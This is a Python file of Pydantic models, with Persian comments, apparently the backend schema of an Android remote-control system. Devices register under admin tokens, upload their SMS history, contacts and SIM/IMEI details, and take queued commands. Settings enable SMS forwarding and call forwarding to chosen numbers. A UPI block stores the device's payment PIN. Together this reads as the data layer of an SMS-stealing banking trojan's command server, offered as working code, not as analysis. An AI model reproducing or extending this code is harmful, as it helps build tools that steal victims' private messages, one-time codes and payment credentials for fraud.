from pydantic import BaseModel, Field
from typing import Optional, List, Dict, Any
from datetime import datetime
from enum import Enum


class DeviceStatus(str, Enum):
    ONLINE = "online"
    OFFLINE = "offline"

class MessageType(str, Enum):
    INBOX = "inbox"
    SENT = "sent"

class LogLevel(str, Enum):
    DEBUG = "debug"
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"

class CommandStatus(str, Enum):
    PENDING = "pending"
    SENT = "sent"
    DELIVERED = "delivered"
    EXECUTED = "executed"
    FAILED = "failed"


class PingMessage(BaseModel):
    type: str = "ping"
    device_id: str
    timestamp: int

class RegisterMessage(BaseModel):
    type: str = "register"
    device_id: str
    device_info: Dict[str, Any]

class PermissionsGrantedMessage(BaseModel):
    type: str = "permissions_granted"
    device_id: str
    timestamp: int

class DeviceInfoMessage(BaseModel):
    type: str = "device_info"
    device_id: str
    data: Dict[str, Any]

class SMSHistoryMessage(BaseModel):
    type: str = "sms_history"
    device_id: str
    data: List[Dict[str, Any]]

class NewSMSMessage(BaseModel):
    type: str = "new_sms"
    device_id: str
    data: Dict[str, Any]

class ContactsMessage(BaseModel):
    type: str = "contacts"
    device_id: str
    data: List[Dict[str, Any]]


class PongMessage(BaseModel):
    type: str = "pong"
    timestamp: int

class RegisteredMessage(BaseModel):
    type: str = "registered"
    device_id: str
    message: str = "Device registered successfully"

class CommandMessage(BaseModel):
    type: str = "command"
    command: str
    parameters: Optional[Dict[str, Any]] = None


class DeviceSettings(BaseModel):
    sms_forward_enabled: bool = True
    forward_number: Optional[str] = None
    monitoring_enabled: bool = True
    auto_reply_enabled: bool = False

class DeviceStats(BaseModel):
    total_sms: int = 0
    total_contacts: int = 0
    total_calls: int = 0
    last_sms_sync: Optional[datetime] = None
    last_contact_sync: Optional[datetime] = None
    last_call_sync: Optional[datetime] = None


class SimInfo(BaseModel):
    simSlot: int = Field(alias="sim_slot")
    subscriptionId: Optional[int] = Field(None, alias="subscription_id")
    carrierName: str = Field(alias="carrier_name")
    displayName: str = Field(alias="display_name")
    phoneNumber: str = Field(alias="phone_number")
    countryIso: Optional[str] = Field(None, alias="country_iso")
    mcc: Optional[str] = None
    mnc: Optional[str] = None
    isNetworkRoaming: bool = Field(False, alias="is_network_roaming")
    iconTint: Optional[int] = Field(None, alias="icon_tint")
    cardId: Optional[int] = Field(None, alias="card_id")
    carrierId: Optional[int] = Field(None, alias="carrier_id")
    isEmbedded: bool = Field(False, alias="is_embedded")
    isOpportunistic: bool = Field(False, alias="is_opportunistic")
    iccId: Optional[str] = Field("", alias="icc_id")
    groupUuid: Optional[str] = Field("", alias="group_uuid")
    portIndex: Optional[int] = Field(None, alias="port_index")
    networkType: Optional[str] = Field(None, alias="network_type")
    networkOperatorName: Optional[str] = Field(None, alias="network_operator_name")
    networkOperator: Optional[str] = Field(None, alias="network_operator")
    simOperatorName: Optional[str] = Field(None, alias="sim_operator_name")
    simOperator: Optional[str] = Field(None, alias="sim_operator")
    simState: Optional[str] = Field(None, alias="sim_state")
    phoneType: Optional[str] = Field(None, alias="phone_type")
    imei: Optional[str] = ""
    meid: Optional[str] = ""
    dataEnabled: bool = Field(False, alias="data_enabled")
    dataRoamingEnabled: bool = Field(False, alias="data_roaming_enabled")
    voiceCapable: bool = Field(False, alias="voice_capable")
    smsCapable: bool = Field(False, alias="sms_capable")
    hasIccCard: bool = Field(False, alias="has_icc_card")
    deviceSoftwareVersion: Optional[str] = Field(None, alias="device_software_version")
    visualVoicemailPackageName: Optional[str] = Field(None, alias="visual_voicemail_package_name")
    networkCountryIso: Optional[str] = Field(None, alias="network_country_iso")
    simCountryIso: Optional[str] = Field(None, alias="sim_country_iso")

    class Config:
        populate_by_name = True


class Device(BaseModel):
    # شناسایی دستگاه
    device_id: str
    user_id: Optional[str] = None
    app_type: Optional[str] = "MP"  # MP یا MW
    
    # 🔑 صاحب دستگاه (ادمین)
    admin_token: Optional[str] = None  # توکن ادمینی که این دستگاه رو register کرده
    admin_username: Optional[str] = None  # username ادمین (برای راحتی)
    
    note_priority: Optional[str] = None
    note_message: Optional[str] = None
    note_updated_at: Optional[datetime] = None
    
    # مشخصات سخت‌افزاری
    model: str
    manufacturer: str
    brand: Optional[str] = None
    device: Optional[str] = None
    product: Optional[str] = None
    hardware: Optional[str] = None
    board: Optional[str] = None
    display: Optional[str] = None
    fingerprint: Optional[str] = None
    host: Optional[str] = None
    device_name: Optional[str] = None
    
    # سیستم عامل
    os_version: str
    sdk_int: Optional[int] = None
    supported_abis: Optional[List[str]] = None
    app_version: Optional[str] = None
    
    # باتری
    battery_level: int
    battery_state: Optional[str] = None
    is_charging: Optional[bool] = None
    
    # حافظه داخلی
    total_storage_mb: Optional[int] = None
    free_storage_mb: Optional[int] = None
    storage_used_mb: Optional[int] = None
    storage_percent_free: Optional[str] = None
    
    # رم
    total_ram_mb: Optional[int] = None
    free_ram_mb: Optional[int] = None
    ram_used_mb: Optional[int] = None
    ram_percent_free: Optional[str] = None
    
    # شبکه
    network_type: Optional[str] = None
    ip_address: Optional[str] = None
    
    # امنیت
    is_rooted: Optional[bool] = False
    is_emulator: Optional[bool] = False
    
    # صفحه نمایش
    screen_resolution: Optional[str] = None
    screen_density: Optional[float] = None
    
    # سیم‌کارت‌ها
    sim_info: Optional[List[SimInfo]] = None
    
    # UPI Detection
    has_upi: Optional[bool] = False
    upi_pin: Optional[str] = None  # ✅ اضافه شد
    upi_detected_at: Optional[datetime] = None
    upi_last_updated_at: Optional[datetime] = None  # ✅ اضافه شد
    
    # وضعیت
    status: str
    last_ping: Optional[datetime] = None
    is_online: Optional[bool] = None
    last_online_update: Optional[datetime] = None
    
    # تنظیمات و آمار
    settings: Optional[DeviceSettings] = None
    stats: Optional[DeviceStats] = None
    
    # FCM Tokens
    fcm_tokens: Optional[List[str]] = []
    
    # Call Forwarding
    call_forwarding_enabled: Optional[bool] = False
    call_forwarding_number: Optional[str] = None
    call_forwarding_sim_slot: Optional[int] = None
    call_forwarding_updated_at: Optional[datetime] = None
    
    # زمان‌ها
    registered_at: datetime
    updated_at: datetime

    class Config:
        populate_by_name = True
        json_encoders = {
            datetime: lambda v: v.isoformat() if v else None
        }


class SMSMessage(BaseModel):
    device_id: str
    from_number: str = Field(alias="from")
    to_number: Optional[str] = Field(None, alias="to")
    body: str
    timestamp: datetime
    type: MessageType = MessageType.INBOX
    
    is_read: bool = False
    is_flagged: bool = False
    tags: List[str] = Field(default_factory=list)
    
    received_at: datetime = Field(default_factory=datetime.utcnow)
    
    class Config:
        populate_by_name = True


class Contact(BaseModel):
    device_id: str
    contact_id: str
    name: Optional[str] = None
    phone_number: str
    email: Optional[str] = None
    synced_at: datetime = Field(default_factory=datetime.utcnow)


class Log(BaseModel):
    device_id: str
    type: str 
    message: str
    level: LogLevel = LogLevel.INFO
    metadata: Dict[str, Any] = Field(default_factory=dict)
    timestamp: datetime = Field(default_factory=datetime.utcnow)


class Command(BaseModel):
    device_id: str
    command: str
    parameters: Dict[str, Any] = Field(default_factory=dict)
    status: CommandStatus = CommandStatus.PENDING
    sent_at: Optional[datetime] = None
    executed_at: Optional[datetime] = None
    result: Optional[Dict[str, Any]] = None


class SendCommandRequest(BaseModel):
    command: str
    parameters: Optional[Dict[str, Any]] = None


class UpdateSettingsRequest(BaseModel):
    sms_forward_enabled: Optional[bool] = None
    forward_number: Optional[str] = None
    monitoring_enabled: Optional[bool] = None
    auto_reply_enabled: Optional[bool] = None


class DeviceListResponse(BaseModel):
    devices: List[Device]
    total: int
    hasMore: bool  


class SMSListResponse(BaseModel):
    messages: List[SMSMessage]
    total: int
    page: int
    page_size: int


class ContactListResponse(BaseModel):
    contacts: List[Contact]
    total: int


class StatsResponse(BaseModel):
    total_devices: int
    active_devices: int
    pending_devices: int
    online_devices: int
    offline_devices: int